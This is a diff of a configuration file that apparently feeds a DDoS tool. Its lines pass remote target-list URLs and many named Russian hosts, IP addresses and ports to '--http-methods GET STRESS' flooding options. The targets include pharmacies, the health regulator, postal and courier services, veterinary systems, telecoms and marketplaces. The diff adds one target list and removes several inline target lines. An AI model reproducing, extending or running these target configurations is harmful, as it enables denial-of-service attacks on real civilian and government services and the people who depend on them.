@@ -1,17 +1,7 @@
 #-c https://raw.githubusercontent.com/alexnest-ua/targets/main/easy_targets --http-methods GET
 
+-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/biggeek_re-store --http-methods GET STRESS
 -c https://raw.githubusercontent.com/hem017/cytro/master/targets_all.txt --http-methods GET STRESS
 -c https://cdn.uashield.cc/sites.txt --http-methods GET STRESS
 -c https://raw.githubusercontent.com/girador/res/main/ddos_separ.txt --http-methods GET STRESS
 -c https://raw.githubusercontent.com/girador/res/main/it_army.txt --http-methods GET STRESS
-
-https://biggeek.ru https://re-store.ru/apple-iphone/ http://s4.digitalearth.re-store.ru https://mail.re-store.ru http://31.31.196.58:80 https://31.31.196.58:443 http://37.140.192.92:80 https://37.140.192.92:443 https://37.140.192.92:1500 http://37.140.192.92:8081 --http-methods GET
-
-#https://aptekamos.ru/tovary/lekarstva/folievaya-kislota-1009/9-mesyacev-folievaya-kislota-tabletki-400mkg-51580/ceni/ https://gls.store https://vitaminonline.ru https://lek-info.ru/ https://msk.vapteke.ru https://www.lsgeotar.ru https://24stoma.ru https://edu.rosminzdrav.ru https://www.proapteka.ru/catalog/?sort=popular-asc/ https://medaboutme.ru/search/?query=putinhuilo https://www.krasotaimedicina.ru/treatment/psychiatry/teletsentr/24h/otzyvy/by-review/ --http-methods GET STRESS
-#https://www.cdek.ru https://cdek.kz/ru/ https://cdek.by/ru/ https://bonus.cdek.ru https://api.cdek.ru https://global.cdek.ru https://mx12.cdek.ru http://pokupkiusa.cdek.ru https://shopoglot.com/?ref=cdek https://pokupkiusa.track24.ru/ http://login.izusa.cdek.ru https://fivepost.ru https://boxberry.ru https://u.boxberry.ru/ https://www.cse.ru --http-methods GET STRESS
-#http://roszdravnadzor.gov.ru http://95.173.145.58:80 http://95.173.145.58:443 https://95.173.145.58:443 http://95.173.145.58:8080 tcp://95.173.145.58:80 tcp://95.173.145.58:443 tcp://95.173.145.58:8080 --http-methods GET STRESS
-#https://ac.atol.ru https://lk.atol.ru/#/auth/login https://uc.atol.ru/login/index.php https://term.atol.ru/RDWeb/webclient/index.html https://www.atol.ru --http-methods GET STRESS 
-#https://dostavista.ru https://couriers.dostavista.ru https://www.delivery-club.ru/moscow https://dotochki.com https://www.pochta.ru https://podpiska.pochta.ru https://zakaznoe.pochta.ru https://otpravka.pochta.ru https://finance-android.pochta.ru https://m1-service.pochta.ru https://tracking.pochta.ru https://mail.pochta.ru https://priem.pochta.ru https://edo.pochta.ru https://voronezh.market.pochta.ru https://tariff.gslbdmz.pochta.ru --http-methods GET STRESS
-#http://mercury.vetrf.ru https://ivis-sso.vetrf.ru http://assol-express.vetrf.ru https://argus.vetrf.ru https://vetrf.ru --http-methods GET STRESS
-#https://youla.ru https://www.doski.ru https://www.unibo.ru https://www.farpost.ru https://kupiprodai.ru https://rudos.ru --http-methods GET STRESS
-#https://msk.rt.ru https://b2c.passport.rt.ru/auth https://www.onlime.ru/bonus/rules/ https://www.ecotelecom.ru https://my.ecotelecom.ru/login?page=/ https://www.akado.ru https://moskva.beeline.ru/customers/products/ https://moskva.myttk.ru/ https://b2b.ttk.ru/ https://msk.dom.ru --http-methods GET STRESS
